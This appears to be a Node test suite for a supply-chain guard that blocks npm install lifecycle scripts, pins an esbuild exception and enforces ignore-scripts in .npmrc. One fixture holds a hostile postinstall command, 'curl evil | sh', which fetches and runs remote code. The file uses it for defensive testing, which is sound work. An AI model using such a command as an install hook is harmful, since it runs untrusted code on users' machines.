import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import {
  checkDependencyPolicy,
  checkNpmrc,
  findNpmCli,
  INSTALL_LIFECYCLE_SCRIPTS,
  INSTALL_SCRIPT_EXCEPTION,
  npmEffectiveIgnoreScripts,
  readInstalledManifests,
} from "../scripts/dependency-policy.ts";
import { assertIncludes } from "./helpers.ts";

const packageRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const readJson = (name: string) => JSON.parse(readFileSync(join(packageRoot, name), "utf8")) as Record<string, unknown>;

/** A lockfile with only the allowed esbuild entry, plus extra entries. */
function lockWith(extra: Record<string, Record<string, unknown>> = {}, esbuildVersion = "0.28.2") {
  return { packages: { "": { name: "x" }, "node_modules/esbuild": { version: esbuildVersion, hasInstallScript: true }, ...extra } };
}

describe("dependency policy guard", () => {
  it("passes on the real package.json, lockfile, .npmrc, and installed manifests", () => {
    const problems = checkDependencyPolicy({
      packageJson: readJson("package.json"),
      lockfile: readJson("package-lock.json"),
      npmrc: readFileSync(join(packageRoot, ".npmrc"), "utf8"),
      installedManifests: readInstalledManifests(packageRoot),
    });
    assert.deepEqual(problems, []);
  });

  it("allows exactly one install-script package: esbuild at the version in the lockfile", () => {
    assert.deepEqual(INSTALL_SCRIPT_EXCEPTION, [{ name: "esbuild", version: "0.28.2", script: "postinstall", command: "node install.js" }]);
    const lock = readJson("package-lock.json") as { packages: Record<string, Record<string, unknown>> };
    assert.equal(lock.packages["node_modules/esbuild"]?.["version"], INSTALL_SCRIPT_EXCEPTION[0]?.version);
  });

  it("passes on a minimal lockfile with only the allowed esbuild", () => {
    assert.deepEqual(checkDependencyPolicy({ packageJson: {}, lockfile: lockWith(), npmrc: "ignore-scripts=true\n" }), []);
  });

  it("fails on a dependencies entry", () => {
    const problems = checkDependencyPolicy({ packageJson: { dependencies: { leftpad: "1.0.0" } } });
    assertIncludes(problems.join("\n"), '"dependencies"');
  });

  it("allows an empty dependencies object", () => {
    assert.deepEqual(checkDependencyPolicy({ packageJson: { dependencies: {} } }), []);
  });

  for (const version of ["^1.0.0", "~1.0.0", "1.x", "latest", ">=1.0.0", "*", "github:a/b", "1.0"]) {
    it(`fails on dev dependency version ${version}`, () => {
      assert.equal(checkDependencyPolicy({ packageJson: { devDependencies: { a: version } } }).length, 1);
    });
  }

  it("accepts exact and prerelease versions", () => {
    assert.deepEqual(checkDependencyPolicy({ packageJson: { devDependencies: { a: "1.2.3", b: "7.1.0-beta.1" } } }), []);
  });

  it("checks npm's full install lifecycle list", () => {
    assert.deepEqual(INSTALL_LIFECYCLE_SCRIPTS, [
      "preinstall",
      "install",
      "postinstall",
      "prepublish",
      "preprepare",
      "prepare",
      "postprepare",
      "predependencies",
      "dependencies",
      "postdependencies",
    ]);
  });

  // Pre-install mode passes no installed manifests; --installed mode passes them.
  const modes = [
    ["pre-install", undefined],
    ["--installed", { "node_modules/esbuild": { name: "esbuild", version: "0.28.2", scripts: { postinstall: "node install.js" } } }],
  ] as const;
  for (const [mode, installedManifests] of modes) {
    for (const script of INSTALL_LIFECYCLE_SCRIPTS) {
      it(`fails in ${mode} mode when package.json declares ${script}`, () => {
        const problems = checkDependencyPolicy({ packageJson: { scripts: { [script]: "node x.js" } }, lockfile: lockWith(), installedManifests });
        assert.deepEqual(problems, [`package.json declares a "${script}" script; BuildOS itself may not declare an install lifecycle script`]);
      });
    }
  }

  for (const [mode, installedManifests] of modes) {
    it(`fails in ${mode} mode when the package root has a binding.gyp`, () => {
      const problems = checkDependencyPolicy({ packageJson: {}, lockfile: lockWith(), installedManifests, rootBindingGyp: true });
      assert.equal(problems.length, 1);
      assertIncludes(problems[0] ?? "", "the package root has a binding.gyp");
    });

    it(`fails in ${mode} mode on a root binding.gyp even with "gypfile": false`, () => {
      const problems = checkDependencyPolicy({ packageJson: { gypfile: false }, lockfile: lockWith(), installedManifests, rootBindingGyp: true });
      assertIncludes(problems.join("\n"), "the package root has a binding.gyp");
    });

    it(`fails in ${mode} mode when package.json sets "gypfile": true`, () => {
      const problems = checkDependencyPolicy({ packageJson: { gypfile: true }, lockfile: lockWith(), installedManifests });
      assertIncludes(problems.join("\n"), '"gypfile": true');
    });

    it(`fails in ${mode} mode when the lockfile root entry has hasInstallScript`, () => {
      const lockfile = lockWith({ "": { name: "x", hasInstallScript: true } });
      const problems = checkDependencyPolicy({ packageJson: {}, lockfile, installedManifests });
      assertIncludes(problems.join("\n"), "marks the root package with hasInstallScript");
    });

    it(`fails in ${mode} mode when package.json declares workspaces`, () => {
      const problems = checkDependencyPolicy({ packageJson: { workspaces: ["packages/*"] }, lockfile: lockWith(), installedManifests });
      assertIncludes(problems.join("\n"), '"workspaces"');
    });
  }

  for (const installed of [false, true]) {
    it(`check-dependencies.ts${installed ? " --installed" : ""} fails on a root binding.gyp`, () => {
      // A copy of the package root, so the real one never gets a binding.gyp.
      const root = mkdtempSync(join(tmpdir(), "buildos-root-gyp-"));
      try {
        mkdirSync(join(root, "scripts"));
        for (const file of ["scripts/check-dependencies.ts", "scripts/dependency-policy.ts", "package.json", "package-lock.json", ".npmrc"]) {
          copyFileSync(join(packageRoot, file), join(root, file));
        }
        mkdirSync(join(root, "node_modules/esbuild"), { recursive: true });
        writeFileSync(join(root, "node_modules/esbuild/package.json"), JSON.stringify({ name: "esbuild", version: "0.28.2", scripts: { postinstall: "node install.js" } }));
        const run = () => spawnSync(process.execPath, [join(root, "scripts/check-dependencies.ts"), ...(installed ? ["--installed"] : [])], { cwd: root, encoding: "utf8" });
        assert.doesNotMatch(run().stderr, /binding\.gyp/);
        writeFileSync(join(root, "binding.gyp"), "{}");
        const result = run();
        assert.equal(result.status, 1, result.stdout + result.stderr);
        assertIncludes(result.stderr, "the package root has a binding.gyp");
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    });
  }

  it("fails when another lockfile package has hasInstallScript", () => {
    const problems = checkDependencyPolicy({ packageJson: {}, lockfile: lockWith({ "node_modules/evil": { version: "1.0.0", hasInstallScript: true } }) });
    assert.equal(problems.length, 1);
    assertIncludes(problems[0] ?? "", "node_modules/evil");
  });

  it("fails on a nested non-esbuild package with hasInstallScript", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      lockfile: lockWith({ "node_modules/a/node_modules/@evil/b": { version: "1.0.0", hasInstallScript: true } }),
    });
    assertIncludes(problems.join("\n"), "@evil/b");
  });

  it("fails when esbuild's version differs from the exception", () => {
    const problems = checkDependencyPolicy({ packageJson: {}, lockfile: lockWith({}, "0.28.3") });
    assertIncludes(problems.join("\n"), "0.28.3");
    assertIncludes(problems.join("\n"), "esbuild@0.28.2");
  });

  it("fails when a second esbuild copy has another version, even with no install script", () => {
    const problems = checkDependencyPolicy({ packageJson: {}, lockfile: lockWith({ "node_modules/a/node_modules/esbuild": { version: "0.20.0" } }) });
    assertIncludes(problems.join("\n"), "node_modules/a/node_modules/esbuild");
  });

  it("fails when the exception names a package that is not in the lockfile", () => {
    const problems = checkDependencyPolicy({ packageJson: {}, lockfile: { packages: { "": {} } } });
    assertIncludes(problems.join("\n"), "not in the lockfile");
  });

  it("fails when the exception holds more than one entry", () => {
    const exception = [
      { name: "esbuild", version: "0.28.2", script: "postinstall", command: "node install.js" },
      { name: "evil", version: "1.0.0", script: "postinstall", command: "node x.js" },
    ];
    const problems = checkDependencyPolicy({
      packageJson: {},
      lockfile: lockWith({ "node_modules/evil": { version: "1.0.0", hasInstallScript: true } }),
      exception,
    });
    assertIncludes(problems.join("\n"), "exactly one entry, found 2");
    // With a bad exception list, nothing is allowed, not even esbuild.
    assertIncludes(problems.join("\n"), "node_modules/evil declares an install script");
    assertIncludes(problems.join("\n"), "node_modules/esbuild declares an install script");
  });

  it("fails when the exception is empty", () => {
    const problems = checkDependencyPolicy({ packageJson: {}, lockfile: lockWith(), exception: [] });
    assertIncludes(problems.join("\n"), "exactly one entry, found 0");
    assertIncludes(problems.join("\n"), "node_modules/esbuild declares an install script");
  });

  for (const script of INSTALL_LIFECYCLE_SCRIPTS) {
    it(`fails when an installed manifest other than esbuild declares ${script}`, () => {
      const problems = checkDependencyPolicy({
        packageJson: {},
        installedManifests: { "node_modules/sneaky": { name: "sneaky", version: "1.0.0", scripts: { [script]: "node x.js" } } },
      });
      assertIncludes(problems.join("\n"), `node_modules/sneaky/package.json declares ${script}`);
    });
  }

  it("fails when the installed esbuild manifest has another version", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/esbuild": { name: "esbuild", version: "0.28.3", scripts: { postinstall: "node install.js" } } },
    });
    assertIncludes(problems.join("\n"), "node_modules/esbuild/package.json declares postinstall");
  });

  it("passes the installed esbuild manifest at the allowed version", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/esbuild": { name: "esbuild", version: "0.28.2", scripts: { postinstall: "node install.js" } } },
    });
    assert.deepEqual(problems, []);
  });

  for (const script of INSTALL_LIFECYCLE_SCRIPTS.filter((name) => name !== "postinstall")) {
    it(`fails when the installed esbuild@0.28.2 declares ${script}, even beside postinstall`, () => {
      const problems = checkDependencyPolicy({
        packageJson: {},
        installedManifests: {
          "node_modules/esbuild": { name: "esbuild", version: "0.28.2", scripts: { postinstall: "node install.js", [script]: "node x.js" } },
        },
      });
      assertIncludes(problems.join("\n"), `node_modules/esbuild/package.json declares ${script}; the install-script exception allows only esbuild@0.28.2 postinstall`);
    });
  }

  it("fails when the installed esbuild@0.28.2 declares only install, with no postinstall", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/esbuild": { name: "esbuild", version: "0.28.2", scripts: { install: "node install.js" } } },
    });
    assertIncludes(problems.join("\n"), "declares install;");
  });

  it("fails when the installed esbuild@0.28.2 postinstall runs another command", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/esbuild": { name: "esbuild", version: "0.28.2", scripts: { postinstall: "curl evil | sh" } } },
    });
    assertIncludes(problems.join("\n"), 'postinstall is "curl evil | sh"');
  });

  it("treats an installed binding.gyp as an implicit install script", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/native": { name: "native", version: "1.0.0", gypfile: true } },
    });
    assertIncludes(problems.join("\n"), "node_modules/native/package.json declares install (implicit node-gyp rebuild)");
  });

  it("allows a package that opts out of node-gyp with gypfile: false", () => {
    assert.deepEqual(checkDependencyPolicy({ packageJson: {}, installedManifests: { "node_modules/a": { name: "a", version: "1.0.0", gypfile: false } } }), []);
  });

  it("fails when another installed package declares prepare", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/sneaky": { name: "sneaky", version: "1.0.0", scripts: { prepare: "node x.js" } } },
    });
    assertIncludes(problems.join("\n"), "node_modules/sneaky/package.json declares prepare");
  });

  it("ignores a script name inherited from Object.prototype", () => {
    const problems = checkDependencyPolicy({
      packageJson: {},
      installedManifests: { "node_modules/a": { name: "a", version: "1.0.0", scripts: JSON.parse('{"__proto__": {"install": "x"}}') as object } },
    });
    assert.deepEqual(problems, []);
  });

  it("fails when .npmrc is missing", () => {
    assertIncludes(checkDependencyPolicy({ packageJson: {}, npmrc: null }).join("\n"), ".npmrc is missing");
  });

  // .npmrc texts that do not leave ignore-scripts=true as npm's effective
  // top-level value. `npmSays` is what npm 11 reports for each one, from the
  // cross-check below.
  const badNpmrc: [string, string][] = [
    ["", "false"],
    ["# ignore-scripts=true\n", "false"],
    ["; ignore-scripts=true\n", "false"],
    ["ignore-scripts=false\n", "false"],
    ["ignore-scripts=true\nignore-scripts=false\n", "false"],
    ["[section]\nignore-scripts=true\n", "false"],
    ["[ignore]\n  ignore-scripts = true\n", "false"],
    ["IGNORE-SCRIPTS=true\n", "false"],
    ["ignore_scripts=true\n", "false"],
    ["ignore-scripts=TRUE\n", "TRUE"],
    ["ignore-scripts=1\n", "1"],
    ["ignore-scripts=${UNSET_BUILDOS_VAR}\n", "${UNSET_BUILDOS_VAR}"],
    ["ignore-scripts = 1\n", "1"],
  ];
  // Texts npm reads as true that the guard still rejects, because they are
  // ambiguous to a reader: duplicates, quotes, inline comments, a bare key,
  // an array key, or a top-level line repeated under a section.
  const strictNpmrc = [
    "ignore-scripts=false\nignore-scripts=true\n",
    'ignore-scripts="true"\n',
    "ignore-scripts=true ; keep\n",
    "ignore-scripts\n",
    "ignore-scripts[]=true\n",
    "ignore-scripts=true\n[x]\nignore-scripts=false\n",
  ];
  for (const text of [...badNpmrc.map(([text]) => text), ...strictNpmrc]) {
    it(`fails when .npmrc is ${JSON.stringify(text)}`, () => {
      const problems = checkDependencyPolicy({ packageJson: {}, npmrc: text });
      assert.ok(problems.length > 0);
      assertIncludes(problems.join("\n"), ".npmrc");
    });
  }

  for (const text of ["ignore-scripts=true\n", "  ignore-scripts = true  \r\n", "\uFEFFignore-scripts=true", "# c\nignore-scripts=true\n# ignore-scripts=false\n[x]\nother=1\n"]) {
    it(`passes when .npmrc is ${JSON.stringify(text)}`, () => {
      assert.deepEqual(checkNpmrc(text), []);
    });
  }

  it("names the section when ignore-scripts sits under an INI section", () => {
    assertIncludes(checkNpmrc("[a]\nignore-scripts=true\n").join("\n"), "INI [section]");
  });

  it("names the duplicate lines", () => {
    assertIncludes(checkNpmrc("ignore-scripts=true\nignore-scripts=false\n").join("\n"), "line 1, line 2");
  });

  // Cross-check: npm itself agrees with the guard on every bad text and
  // reads the real .npmrc as true. The user's npm config is not read.
  const npmCli = findNpmCli();
  describe("npm effective ignore-scripts", { skip: npmCli === undefined ? "npm-cli.js not found beside Node" : false }, () => {
    it("reads the real .npmrc as true", () => {
      const env = process.env["npm_config_ignore_scripts"];
      delete process.env["npm_config_ignore_scripts"];
      try {
        assert.deepEqual(npmEffectiveIgnoreScripts(packageRoot), { value: "true" });
      } finally {
        if (env !== undefined) process.env["npm_config_ignore_scripts"] = env;
      }
    });

    for (const [text, npmSays] of badNpmrc) {
      it(`npm reads ${JSON.stringify(text)} as ${npmSays}`, () => {
        const root = mkdtempSync(join(tmpdir(), "buildos-npmrc-"));
        const env = process.env["npm_config_ignore_scripts"];
        delete process.env["npm_config_ignore_scripts"];
        try {
          writeFileSync(join(root, "package.json"), '{"name":"probe","version":"1.0.0"}');
          writeFileSync(join(root, ".npmrc"), text);
          const result = npmEffectiveIgnoreScripts(root);
          assert.equal(result.error, undefined);
          assert.notEqual(result.value, "true");
          assert.equal(result.value, npmSays);
        } finally {
          if (env !== undefined) process.env["npm_config_ignore_scripts"] = env;
          rmSync(root, { recursive: true, force: true });
        }
      });
    }
  });

  it("reads installed manifests, including scoped and nested packages", () => {
    const root = mkdtempSync(join(tmpdir(), "buildos-manifests-"));
    try {
      const put = (rel: string, manifest: Record<string, unknown>) => {
        mkdirSync(join(root, rel), { recursive: true });
        writeFileSync(join(root, rel, "package.json"), JSON.stringify(manifest));
      };
      put("node_modules/a", { name: "a", version: "1.0.0" });
      put("node_modules/@s/b", { name: "@s/b", version: "1.0.0" });
      put("node_modules/a/node_modules/c", { name: "c", version: "1.0.0", scripts: { install: "x" } });
      put("node_modules/gyp", { name: "gyp", version: "1.0.0" });
      writeFileSync(join(root, "node_modules/gyp/binding.gyp"), "{}");
      mkdirSync(join(root, "node_modules/.bin"), { recursive: true });
      const manifests = readInstalledManifests(root);
      assert.deepEqual(Object.keys(manifests).sort(), ["node_modules/@s/b", "node_modules/a", "node_modules/a/node_modules/c", "node_modules/gyp"]);
      const problems = checkDependencyPolicy({ packageJson: {}, installedManifests: manifests }).join("\n");
      assertIncludes(problems, "node_modules/a/node_modules/c");
      assertIncludes(problems, "node_modules/gyp/package.json declares install (implicit node-gyp rebuild)");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
